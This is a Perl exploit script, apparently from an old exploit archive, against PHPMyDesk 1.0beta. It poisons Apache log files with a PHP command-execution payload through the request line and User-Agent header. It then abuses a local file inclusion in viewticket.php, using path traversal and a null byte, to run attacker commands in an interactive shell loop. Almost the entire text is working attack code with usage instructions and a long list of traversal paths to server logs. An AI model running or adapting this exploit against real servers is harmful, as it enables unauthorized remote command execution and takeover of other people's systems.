#!/usr/bin/perl
#
# PHPMyDesk 1.0beta Remote Command Execution Exploit
# linK : http://www.cynux.com/phpmydesk/
#
# (c)od3d and f0unded by Kw3[R]Ln from Romanian Security Team a.K.A http://RST-CREW.NET
# Contact: ciriboflacs[AT]YaHOo.com or kw3rln@rst-crew.net
#
# File inclusion: www.site.com/<path>/viewticket.php?pmdlang=<local/remote file>
#
# Vurnerable code:
#   in viewticket.php: include('pmd-config.php'); [..] include($lang_mod);
#
#   and in pmd-config.php is
#
#      if($pmdlang){
#          $lang_mod = "lang/".$pmdlang.".php";
#                  }
#
# Shoutz to [Oo], str0ke, th0r and all members of RST
# PS: fuck CarcaBot ..another lame romanian guy =))


use IO::Socket;
use LWP::Simple;


@apache=(
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../.. /../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

print "[RST] PHPMyDesk 1.0beta Remote Command Execution Exploit\n";
print "[RST] need magic_quotes_gpc = off\n";
print "[RST] c0ded by Kw3rLN from Romanian Security Team [ http://rst-crew.net ] \n\n";


if (@ARGV < 3)
{
    print "[RST] Usage: PHPMyDesk.pl [host] [path] [apache_path]\n\n";
    print "[RST] Apache Path: \n";
    $i = 0;
    while($apache[$i])
    { print "[$i] $apache[$i]\n";$i++;}
    exit();
}

$host=$ARGV[0];
$path=$ARGV[1];
$apachepath=$ARGV[2];

print "[RST] Injecting some code in log files...\n";
$CODE="<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "[RST] Could not connect to host.\n\n";
print $socket "GET ".$path.$CODE." HTTP/1.1\r\n";
print $socket "User-Agent: ".$CODE."\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Connection: close\r\n\r\n";
close($socket);
print "[RST] Shell!! write q to exit !\n";
print "[RST] IF not working try another apache path\n\n";

print "[shell] ";$cmd = <STDIN>;

while($cmd !~ "q") {
    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "[RST] Could not connect to host.\n\n";

    print $socket "GET ".$path."viewticket.php?pmdlang=".$apache[$apachepath]."%00&cmd=$cmd HTTP/1.1\r\n";
    print $socket "Host: ".$host."\r\n";
    print $socket "Accept: */*\r\n";
    print $socket "Connection: close\r\n\n";

    while ($raspuns = <$socket>)
    {
        print $raspuns;
    }

    print "[shell] ";
    $cmd = <STDIN>;
}

# milw0rm.com [2006-10-28]
